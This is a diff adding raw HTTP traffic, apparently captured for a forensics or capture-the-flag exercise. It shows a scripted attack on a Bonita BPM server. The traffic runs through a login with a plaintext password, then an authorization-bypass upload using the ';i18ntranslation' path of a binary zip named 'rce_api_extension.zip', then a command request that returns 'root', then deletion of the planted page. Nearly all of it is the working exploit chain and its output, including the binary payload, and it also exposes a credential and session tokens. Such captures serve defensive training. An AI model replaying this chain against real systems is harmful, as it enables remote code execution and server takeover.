@@ -1,0 +1,243 @@
+POST /bonita/loginservice HTTP/1.1
+Host: forela.co.uk:8080
+User-Agent: python-requests/2.28.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Cookie: x=x
+Content-Length: 39
+
+username=install&password=install&_l=en
+HTTP/1.1 401 
+Content-Length: 0
+Date: Thu, 19 Jan 2023 15:35:04 GMT
+Keep-Alive: timeout=20
+Connection: keep-alive
+
+
+POST /bonita/loginservice HTTP/1.1
+Host: forela.co.uk:8080
+User-Agent: python-requests/2.28.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Cookie: x=x
+Content-Length: 59
+
+username=seb.broom%40forela.co.uk&password=g0vernm3nt&_l=en
+HTTP/1.1 204 
+Set-Cookie: bonita.tenant=1; SameSite=Lax
+Set-Cookie: JSESSIONID=ECD4DBCB8973A78BFB74972678B3123B; Path=/bonita; HttpOnly; SameSite=Lax
+Set-Cookie: X-Bonita-API-Token=63c9d60d-2876-4cd0-a445-e2509707959b; Path=/bonita; SameSite=Lax
+Set-Cookie: BOS_Locale=en; Path=/; SameSite=Lax
+Date: Thu, 19 Jan 2023 15:35:04 GMT
+Keep-Alive: timeout=20
+Connection: keep-alive
+
+
+POST /bonita/API/pageUpload;i18ntranslation?action=add HTTP/1.1
+Host: forela.co.uk:8080
+User-Agent: python-requests/2.28.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Cookie: JSESSIONID=ECD4DBCB8973A78BFB74972678B3123B; X-Bonita-API-Token=63c9d60d-2876-4cd0-a445-e2509707959b; bonita.tenant=1; BOS_Locale=en
+Content-Length: 15163
+Content-Type: multipart/form-data; boundary=cb15c93cad4566f30232d5ecac68b23a
+
+--cb15c93cad4566f30232d5ecac68b23a
+Content-Disposition: form-data; name="file"; filename="rce_api_extension.zip"
+Content-Type: application/octet-stream
+
+PK..
+......K.T............	...META-INF/PK..
+......K.T................META-INF/maven/PK..
+......K.T............$...META-INF/maven/com.company.rest.api/PK..
+......K.T............8...META-INF/maven/com.company.rest.api/resourceNameRestAPI/PK..
+......K.T................lib/PK........8M.T~v..............page.properties}TMk.0..............Zw[..!u...,.<......4...}.....C....y......).l..B..-..).t^..4.=...........>.......m;..	t.t..K....$..'d`..].....F....|A.T..s\...yM_$p.'....x.i.GG.....'........&.S.|...@.$.3.....6./..."e...Nu...'.p)...,...
+....A...b......TDi
+.C..8?N...Z8`..,.k
+.....?......A......b<:...)..@..l...U.KL.|.R......Vk....S....._S.......).^..	...S:.L...V..'.~..Sc.e9.%.7..m.[Qnf./.{.oZ..on...,6...v.<+...^6.|..y...<(..D=.The)t.'..........!."..^'W....`K....=.>.2....c;.Z...a?..... ..^......eW........e....;2.P
+.[..
+.97.....Q.H....)....f2..Yg...f........CM.;.....){.Mhm{j....#......m..V.V.#.J@....MhZ....JY..Q...]........,.H../*.B.m..Q/...aB....u.....B.;...8]'......'....;...w8E....U/#.$.%.q..tP/..X[...).C_);......=..............al...v.....f.."..e..PK........*i+T........F...?...META-INF/maven/com.company.rest.api/resourceNameRestAPI/pom.xml.Y[..6.~G.?.S.Z..wv.@(.A......R....I<3^.8.........e... VB..4c.>>....x.g.i.....gO.Kt..h...e....W.........\.k.)...|..).?.8%{.!..hG..[|.~....-. ..J..onn.......,._....0%>.."YD...y..V>.f.-..2.Mn.
+!ne\......",w.R.......L..5V......8.x...N...T*.......D(.!.....BD..I......	.5_................
+.....f '...U...j4.2.,.D.....<..S.KIF......
+n...s
+jQ........J3...=~M..5:/........u....Z..|,4...Q.C..9.M.-....5$o.g.,}..Y...D..m.H.
+..A...c..Ci..Qx.e....1E:..../.L.h8{..g....{..`..d.....qq\v
+.......Hw@l....."..G.....
+j....	......)Yd.>Eg......t.<)...:.+.X..K..KP#..=F..>....k`.t..........
+.QDl...S.z..zh.N.......z.d!..	....S.W..BY.*..Q.rI.z-..i..`...DE;K.	z..,{...&u.V.j2bN.........f-..y{U....gj.M......*...M..........H..<u\......|vg./.}.[..9
+s....@..x.Y..&.
+..C.n1c..;.v.-+tm..u..s.,C&...!s8L.h..*.i
+..5*....,.q..a.....*.#.De..9C.+..gw.y.&...*..G..K...^.=.{\$Tzl......I..')5......-!....,.Q.].Tvh.....RJ...[7.O..s.-.T....P.Z..B....gp.l.^.....XWw..x...@O....Q.6..0./h....e6.nD....q.U?.-..;*..G.Fd....Pw0..E...:.....-.j......x...|?.b..G.M..3.Q......
+..g.eSX..........wE...|]...Y....V..x|..
+..~b..\....b.)*@g*..j.2
+.....;.u.6..<.....r5}D.:?q..>f..;-.....Iwr.^Ev...)...y.."Q.9IBP.m.z.q.n=Mc..n.Hqq.....`......Z...t....z....e.....y.....3-..y.zS*..J.X...
+g.5Q.w|d.i.o.....p....:{dw..&..H.......M.....E<..m!.r.*P).X.w...[......j...W..4.......|.O;..F..B.o..6*	.<.wg.<c|35...o..y/.'..c8.{..y.....x...XzK.BG.`.4.1..;".$.{.R!Pa~..
+\.C;.@...,..E.....S"g%..\?.s..P.|n....1._...k...9./.......W....8.....c4.J.x.....'.....K..o...?PK.........K.TV...........F...META-INF/maven/com.company.rest.api/resourceNameRestAPI/pom.properties
+..
+.0...@.!......C..:..*t~.g.`..Q.....;..c@......	....OQ.H.Z.kS.F+.n.0...~......WYH.NI.e	.s....S.C.q.	{X.]..:......j.....u..5r..PK.........K.TeO:M.+...2..*...lib/resourceNameRestAPI-1.0.0-SNAPSHOT.jar.z.P]..-n....]......l.-.......A.......!8..s.....s......].z..sV...c.^CM...	..c_1N..w...T...g.W.aS....../3.y......_...f..*.2..Z..2...cJ.,..(.,....F
+.9..=Wf..0."....n.N
+..7j....
+,E
+M.\.Zl.7..\.8.Xc......7.>m9
+\n
+.>..5C..^d.!...B.., 4a.P..
+..i.0.&.....-..e.k:..}..%..,]-....9._..9.........&~.....A@...D.ha.M......B....B....	.f.......j..
+p0ss....%....B.&*......H.A9......t.*R..t..w.4..r2....;..u\.;.h.h..K..q:V....(D&V..8...x.8	X...z.y.........S.....
+.PH....9.Rl:mL.F.....#	f...p.K..e^.}...gX....?.{e....nq.Y.".......SSg..F>.<...Ee...qVh........Y...V..qH.)r	.M"4~/+..r........#..........N.+S.m.8.Wx*).[q...3...=b^.]ll4....`T ..Oee..R........p..Hf...y|...m..I&...%Y...f.$.?.d%.z.`.......S..p..Y.5j..;Yy3...)....P....@yy.&$.....FW.......V..o.*.....T...7WU......P."..A.#.....E...UCZ..X...'.........]!....B...U6..!.......:............
+..OM....F...?.....C
+..heZ....sq...j..d.{n...V+|.9.qm...W.....&.[....9..4.M....Q+......m...L....	..8F.J.A......=..5|.jI.'U..SE../>*.Q..PW....G.U;.....G.V".V.B..<...C...@..^.......I.....*....+..@...p......I(...M(
+.K>Y......~.....,.....b.\..|Q.;l......'<...yZRF..r......+...;A[-._q.2.&.......e....0...IH.....yM...0.Nu..8...Y....u>8..4p&2....@. ......S<....}q...s2..C....d.....H...y..%.n.N....0.C........p......043.o5.S.Q....9..."...~.(.....1,<]..f..Rq.z.T.....K.O8Tv..........Y_$..R.%....].K.....'T.
+.EA..Jo..H_.....B..wu>..]".i.w.;.&.W.....	.,.B
+{..:......CS...a0..].D...e...
+.0.........rL.(...a...#...a...=.7}._O.F	,..<Hk.$rM.=lVy..n&.D..(.........#....1...O.0..S....F...m>.\^!7\?..[@1....
+......(.z.....[.$....ae.r.P.......4...T..g...Q`.%.7q.v.......5@n.U....C?faB.Y.(...4=...G......BkB..H4.,.)y?.....9...\i.+>rmI.. .-$"s.X.0. .8..F.~...hp.[...!Y...Y7.....}aq.K+.[^...q..}.6..WR.9u*	=B.......ib.BM&...%K..rU]...f.^@......ik..._Ikf=......[..,...>#..Fj...Qm.`...l{.....*....
+.....'..w..........7....8.%...../.}.xL6.5...=:F;.K{.z'..\.l!q...~.5...u....i...2...S2.8^XF3AbS.:...j.B)B..<,..HQ.......-	..}.oS..?F..'XbM.N...	=i..Q.hGmv.......M.....]..8.W.N|..S..:....>3...8....X_.8Q._..5z[o...K.].E,2@...7?
+..Pv.......R.....I2._.!..G.#..BR...".q..............T.{],Y.@ZH..*|.~.Z.Tj....7va.....
+.c.-...g...j;.....[..C15G....r_....3.F".....V..>l...?./....{..s...U.C...
+.....	h.........`. .R............s.ze>W..u.XW.~...SV.X%.CtME$..5E[.....D......
+...&...B..Fd...*S..c..d>JyHZ.a{..~+V.~&...s..r....J.8.<
+....H)o...e-......%:m...p...."x.=.=Gbt:.H9A)........sGB!%`..M..o....I..8.l.I.`<6t-|.pr.Q"#_......kQ.R..-.LGy..d..yM.| y...# .[..'D..%_.....9.o. *.{...d...vB:..v.....22.$,.`Q.i.D.7+..zO.......N9T.Z.....{.*.F..1.-p(H."i.........	.g9.&..k....%.8T...k.......5	...6.~....6.>.........X.0..1G^...[......C.,R.....6...B.......>......%?..[Za..-......K5-.>Ac._Jp.j.,.(.]....k...6......`?....e+.Q9%+$0.n.Y....3..6...s	...NS.s.R..HA...E...!...Pz_...o.A..s.t.,RJ.R....]3.C4<.
+.;..~....YI...h\))..e....$..H...+.......h....+X..."..^.7.Wq49..$.{..
+..8..]{{N&..9.	...$.E|%.....86..
+jk..B.;...i...a..^8.....f...k.._....\.v;.Y.{................UJ.{z)...".=.?.=.....3F.....Fi.Qb0.'.%.,....CJrN.z`...5.k)..>.....5....P.s..(.F.)....A;!r...yYv.a.".IH...aGU.m`5..C............=..@vHk.....f.....-..`...B...&.\....{.p.9.........k.
+7..dyy
+_I.M.^..Z=.).)."9.g..5.3.....}TD..&...2.C.....M.H..~Z."Y...I..T....z..E.QW.@..oh.\X.$3\....2?..o...RY.k..ok.......b{&AS..........C...%...
++#..N
+.f.Ox..P...fU.q.......D.
+Q....{...h...Z...c..-...Z.......a)..f...c...6w..d...Es.......ar+...r;.0.;......4O...d..0..!..j....m.M5.........br.
+;.J.:...Q.Dz.2.Q..x....`.......?A.....-0..6.9:.j....lV:FMl[._bU........j..t...E.:".j......8w...
+T....	.....T..p..'...$...y......i.+.uZ7.
+.w?.......\<..#..".H.^.n.........Nlr....6.....;..FdT....q...P.'..q....^R.>mj..7".L..	.....B..q.....a! .~......qp2.Psur.tu..t./...'....z..`w....Z44..5..#."G.d.Tp.....3.=....EUO....|~r.vt....6.....J......T...X/..s.&...W.....
+b.J..c.....z...eU}..S,.e .vU..c..B..!..V{...#.f0.B....BK..h....,.l.J..3_..y.P..o...m..X..V.+E`.w^`=Z. b.Nr..Z.ZX..lF..].ZA:..8...fC.e..W4....<..^...=f..Z.y..4S`;.k.).$...G
+..	r.	.<.(.z..I5..1.............|.P.@2E2.\..v.>.fu..[.......O\...XW\...^..w.>.p.0....7e....y;q....J..9.C.v..?.?....
+&.B..R..!?...V...	.G.....;.\.!cX...$...UHR1.i.r.....& _....*B
+.....-!.%N..!V.;.k......G.k..?A....S(.s..B.X"S`I...Cg...Bj....-e.._".zl..jr~.{	..[1...k._=vHE .\.....@..}...9c..+.L..a......*...{..l|.....H......gR.*.X....I..q.vb...&..&...A.C.. ...j&o9.I...;........Z|.....B..g..y.'4.......$....d...-!...	.d.`.d'@.Y.
+....{..x...OH.....u..P..."J._.v..:Q..I
+....b....).:.UkY...4\..~HYX.{....+};....V.=...r...:..i..%...c:N.}5...8Q...F...n.X.%C...|K!#.
+Ck..I.o...q.Z..<h.T.....'..Ba.P.j....f...xt3....b..&..9..&...|.p...........l<Xj.o.S.A........^.Z......	....c.....(4.q.
+. .,...e.E........}.h{."..z...)2.y.Y....LY.0z)DNU...VU	....{~.s.JyY..g.a.....TF.{.=.....$....*2..JGx.).&.#..]......M...e..I;...o..$..
+"ly.:Ee....	..P...,.....A.......X..hD,..8..i..t...R..gvE..".[.>TK....a...Y.."N..qo}...A.W....|jAl..l ...x..4<..Z=h.se.:.-.n...k.Z.y..$
+?..D.u..k.j
+..>..
+....5.J....?.T.v......r|
+9.z.....|.I..(.=...
+.$.I.#c;"E.g...[D.|..n#..Y .'85.M....<.<......(	..D>%9...u......N.nf....v..`.p.y.0..F....)..d./.......
+..YB..g.-7d.... ...?5.....<...Y.....{....n.G.6..x...!....X.....M...15..C.f.?.A..Y.t.....PD. s......A...2S.....Pb.......]..k.....W..h.hK.2.P<O%.K..w....<.7...gO.n..B.j......%....X.9..Q"..|.+....".#...;...`..R.n..B.u.v0..(z.
+.5......"......%wK...qH....Kw...F:..^...%.~.`=L...y..C.v..
+
+.G...g.-..IK.1.r.......iyq(c..C.yT..(\..cX.Yq.J;....HB...........C........t.V.......+.3K...0..&09d...yv...b.@.._9l.l.k...7,.\.j.N...9K.
+/X'-9...r,.O.........dQV|[.W..D...D....mK`..a.&#a....qQf:R...Q..qg9...."...H..\.......h..y\..-.U.N.Xf..eA.b.s...F...^...^N...0...a.#..+....}B.......o.f*P.......... ..b.G..d.....z@.As..|w...{s.wK..`..wC........u.E../...Q.r.j.M.RH)(.T[.....m....B..9$.....0[.....f.ekH..5....x..3m?~.7.l[F..7u.E......P.8.....T	3X.\..8]....g.HJ.x.b.BT.m.....-<..$Ln..a....#.jau.'W..>..`^.b.H...%..+9..R=:N.M..b.g....=~8.B9c..S.V.wZ.V.G..`I...N....`..v&.....D..?.g..lIe*.T}~.bEo.N.U4`.w.O.k..wp.i.	.......M.<H..a.+_...1.L8D...q...C...U.dv{..J.j.h=.........M..0
+Q.>m...m..yN..0.....%c...)....#ab...sm..c......Nqs3u...+"...s..]..i....'.1?-.%U.?.\.^u=...sW.p.FMC*$.3...~..x...v.q....G
+G..4N.N.df.v...E..S.....;1...e..7.......	J.@.Z...~e.B.|..n...Ww0<6o..!\...C.T.f..z.q..:fz...|.....S..<..R..K.v!P.3g.d.....F.4.&....'._....<D.0PT.8V.....u
+...(.a#r..[...'......&xI23.....	M..joy`.......b.......o[..l...*...;l.;GP.*.^e.n#....	Su.D..?.........`/.Ds.J[......1";<.z.g..]`.....E..........b......a.....u.(]..A%.H..c.......Ln..l.l
+8=._...$..O./w...o..&..M7k_.?D..zl2|.[..{I..&.[......w)...^0....u	........k..B..0...D ..:.-=u.Z......8.4&.sz....>.=..f..+A.F[...sS*KOz;.+..F..;i..\0\w/.k..5.;..g....:......Q...M'...WVr.1;.....u;DH.F..iP.c.m.e...R-....f....gf3....H ..O	l.lmg.^V.OOl..D.+.d4w..;y<......p.\..v..?.*.&...;.	..K.p.Y.n.....o......o..:5.pxH3+7....E..f.%....H.....g.z. .jrk3..;=.....r.T...5.....1X....j.lO.....*.+..g..
+.....h....8.P.....Y3.....WI..$1w....m............beNY..w.V.Ji.9...:.M.c..[8W4F.JL..#7....1...Xe...*.j.....y....asM.M..x.?7.. .+...B#.c..m*..., .g..RT....3....93..F.K...F)..i...,H[......N(M0.(.....d.,K...y.89YE......o..IY....Vy.b.t..h.*z.m...Ci..."..""I._Nh.e.)..F.!P..
+}kc.....q...&..`qT..t..w..2z...akTs.<"Zh.E........S..9.\fqC.I......EDS....>h........,...+y...W...-.Q......"'r.iR.........8.^..U..O.......^.
+hpK.:...E"........E.......n..7H|7
+!$...H.PL......=....l..OX-.Q..+U.	a..9...C.~.i...z...rv8..=...v........'*;i..a.....h.9}..y..X.j.....x.......a....,......"z..Jh..G.}.\"...7....F....z.hG...\s7Z..j.9e_$..iS..k'...A.....=.b.].v...L..9u$..A6..;Q. .5.......Y..z;+...6...m6.z.\.. ..it[....d~...Ub...N...	:....g;.....5C.v.k......R...{......e..w..Z..R}R/..k2...A..MwW.z........!...p1!.....P&).......|.......kk-......;...A...b...c.x.....!U7..tm.0?4......=..;"o6..*X..I.lm2..b.......".bp..s.;.......$..?..=..+.......{b$ .b...C..
+Y	@s]..=..5V....	..nc|Z&.i(.G.....4){...7Y.@bW
+..._....7.SR~	..\........;..r...k/q..>......p...{...U.0~....7...]Q....h.nv.].....e@[I9H.i#S.E...e..C6X...,.J.=g....6[#..;]....4....v2[..kI........5uk?.G.U........3;...L.h....5...Kw...C...H..I.UK.,......jz	d..O.N.|..
+...'..In...#.En....R:...,.|.r.:.#
+.\...f..n....X..'n......S.S.?^L/...V}..s@"...A/1..5..)_K...<......h.	Sm....x\.o./3+}..4....F.6...V.~...`p+".........P......rR..~.b7..;........c0..........UH]..Rc...........).....V......|..../".x&...h1..0i!q..t.....D3...KS.T.|..K..n)7....ij.).R..	.....,...sV....._.........D.~../...Y......g..s..M5s...
+^.,..7v;m..?4u
+6.1.^C._}j..L.D.C%.MU*'"X.......=...R.6Q..Iu.....fRJH...NrbN[.....t*
+w'..~......^..... ...@..............z.v..;...I..R.\.aK....x.Y....S..p
+9....	.t..F...1T..>..q..I#..MIE.,v...CG......Q|yM.2h.....GqG..R3s...w.4Ue.....Tj}$....C.../.	.>.q......E
+F.(;~.x....._.8.a...?ZZ.0=..(z...C.#v3.~...}. ....Y...E.!..b6..@Wk'.....a..2.O.
+..5.8ZQ.L)|m.{Z.<F....r.......N/....T.....#...Z7.`....a.....|.[>.:0.pC"..q...(...zU.D...fU.....sJ}.L.-Z.l..v.l\.x..0...Z8...T.:....t.v...i,..gD8.s7,..1.8...NYkb.VG.Y._...W;.??.].......#..m.2.......k.....o......
+..r-....:|..j..4..Q.....}...kd..B..
+.1.7.eo..1|$..:1....\...m......W..K...K.y...}.\I....K.j..s+u";.".
+.x..i...2.O.S.........2.v......B9.
+.j.=TN...3.LQ5..:.....*....-.[....sk~......en.y...fO....Q....%2!
+m
+.c..
+....N..\..c.5..52.....g....%..5..}.............Yq.
+^S......PK.'.A..\..v..(.n#.<.TLT..;.T.hj. ..J(..V.o.Sh..D9.yZ...........Y.u........+..........'.W..........j...#1.2i....,.B@..A@../.:.2.vt..7L.......+.$5.l...|K.#^...<...T..)/.e....:.G..9....o#.. 	..........?X..n.U&.Z..)........\-.A..~N...}..1..'d@...o_bH.......HJ....3..
+.#+.b.$..+,.8..S..=.y9.W..[...iD.J(..../|n.uD?Z=.$Dr>).OP(..F.Op.....^o4Hgw'.>L)....l5..=f..zGo..|...b\..m...&E.L.1......
+....f~~7b=.....t.&.......A..H.].EPV.t..g..'Z...81......X....5...2.s....(...87$;u..3.....
+\..]"..w0<.l.`....'..=I....U.........i.....,.a.ox....G..J..
+..R3...rQHh...8....I[.Mu.	.>..<.i......h.76.~.i.+.pe~..L/.-2....\\.<.@0]#...r^o..Q..N(..dW..0_..n.k..7>E...3.[...,!I..I............."H.+......Ed.FE?.......o}.l&..<[.C.S.r..J...-...iWA}.%8...;cAq.....W....C$....V...*O..rKj{[f...(%-..F.=.g..\.....9..4Wi....7..-...7..O;......L.9.+l...#.we.........gr....F....#d...Qlw......(n.1..o......fiw...%.....(.P.i.&w..V..6.)fI....
+7~%H..u.,[..H...o.w.e...fy.$....TaR.0...8L.I.^.>c.A.P...d....P.L.E.....|..S........1..f.F...P<...0.....hy.....aj(......T.*w;gI.:...W[0...8?...v.t 5..^.....:..n;.x..{.=.^.........d.....(.....r.-..._).x.-./c.THR...>.,.4.-.F.[E..k.-......'.._.....l...0W.z......
+..u...^.........t/...>...2.../9.:Sw..;.H......Fe.u..i..o...^.z9.j....	ex..v...z..Zs.	....s........Lv|@...r]1...i.b..o.YN.T....P{.....2..Q..`._.\\.J#.:M	>...~3...v.Y..............Y&h.#.b!..)..d.......q.d=..~..o....	.......j.U...k...{..)....A.r.$.....j.#E.+4....^.W...!~z\...].._...{t<...k..FU.hEffZ..	....1G...zH....S;...7..FL......a..4>.D.x.'L..U,...6........,...#..P3...D1...j~[.Z.<=)}6..~P......H...t...?0o{+...]}W..]B..![.R....<..o.D..YS......z..+.N....c!?)..;!_.........uB..ZE..2.K....D.n@...
+q...b..._."Y0%8....8o=b...~y........6$..!o....T...-whPa.y"...,f....b..M.a.......Z".....@i.JF..#..].....PK&...*K..;=.vx\....!....^.....q&.........Z)._.$....u....W.....@........@.@.Y...H.? Q .R...p.?...
+.....|.."..|9....T...P.........]...(..........:.s.?...-L..............=..h...?.70:....4.Q..=...`..	..:..=...c........2.W..o.......:.......-......XM.....B....1|.....PK....
+......K.T............	............A....META-INF/PK....
+......K.T.........................A'...META-INF/maven/PK....
+......K.T............$............AT...META-INF/maven/com.company.rest.api/PK....
+......K.T............8............A....META-INF/maven/com.company.rest.api/resourceNameRestAPI/PK....
+......K.T.........................A....lib/PK..?.......8M.T~v............$....... .......page.properties
+. .........*.y]UO....{]UO......TO..PK..........*i+T........F...?............. ...META-INF/maven/com.company.rest.api/resourceNameRestAPI/pom.xmlPK...........K.TV...........F.............T
+..META-INF/maven/com.company.rest.api/resourceNameRestAPI/pom.propertiesPK...........K.TeO:M.+...2..*.............9...lib/resourceNameRestAPI-1.0.0-SNAPSHOT.jarPK......	.	.....h7....
+--cb15c93cad4566f30232d5ecac68b23a--
+
+HTTP/1.1 200 
+Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate
+Content-Type: text/plain;charset=UTF-8
+Transfer-Encoding: chunked
+Date: Thu, 19 Jan 2023 15:35:04 GMT
+Keep-Alive: timeout=20
+Connection: keep-alive
+
+{"filename":"rce_api_extension.zip","tempPath":"tmp_14830419339383496080.zip","contentType":"application\/octet-stream"}
+POST /bonita/API/portal/page/;i18ntranslation HTTP/1.1
+Host: forela.co.uk:8080
+User-Agent: python-requests/2.28.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Type: application/json;charset=UTF-8
+Cookie: JSESSIONID=ECD4DBCB8973A78BFB74972678B3123B; X-Bonita-API-Token=63c9d60d-2876-4cd0-a445-e2509707959b; bonita.tenant=1; BOS_Locale=en
+Content-Length: 83
+
+{"contentName": "rce_api_extension.zip", "pageZip": "tmp_14830419339383496080.zip"}
+HTTP/1.1 200 
+Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate
+Content-Type: application/json;charset=UTF-8
+Transfer-Encoding: chunked
+Date: Thu, 19 Jan 2023 15:35:04 GMT
+Keep-Alive: timeout=20
+Connection: keep-alive
+
+{"processDefinitionId":"","updatedBy":"-1","urlToken":"custompage_resourceNameRestAPI","displayName":"RCE","lastUpdateDate":"2023-01-19 15:35:04.825","description":"REST API to manage resourceName","creationDate":"2023-01-19 15:35:04.825","contentName":"tmp_14830419339383496080.zip","isHidden":"false","createdBy":"","isProvided":"false","id":"130","contentType":"apiExtension"}
+GET /bonita/API/extension/rce?p=0&c=1&cmd=whoami HTTP/1.1
+Host: forela.co.uk:8080
+User-Agent: python-requests/2.28.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Cookie: JSESSIONID=ECD4DBCB8973A78BFB74972678B3123B; X-Bonita-API-Token=63c9d60d-2876-4cd0-a445-e2509707959b; bonita.tenant=1; BOS_Locale=en
+
+
+HTTP/1.1 200 
+Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate
+Date: Thu, 19 Jan 2023 15:35:05 GMT
+Accept-Ranges: bytes
+Server: Restlet-Framework/2.3.12
+Content-Type: application/json;charset=UTF-8
+Content-Length: 74
+Keep-Alive: timeout=20
+Connection: keep-alive
+
+{"p":"0","c":"1","cmd":"whoami","out":"root\n","currentDate":"2023-01-19"}
+DELETE /bonita/API/portal/page/130;i18ntranslation HTTP/1.1
+Host: forela.co.uk:8080
+User-Agent: python-requests/2.28.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Cookie: JSESSIONID=ECD4DBCB8973A78BFB74972678B3123B; X-Bonita-API-Token=63c9d60d-2876-4cd0-a445-e2509707959b; bonita.tenant=1; BOS_Locale=en
+Content-Length: 0
+
+
+HTTP/1.1 200 
+Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate
+Content-Length: 0
+Date: Thu, 19 Jan 2023 15:35:05 GMT
+Keep-Alive: timeout=20
+Connection: keep-alive
+
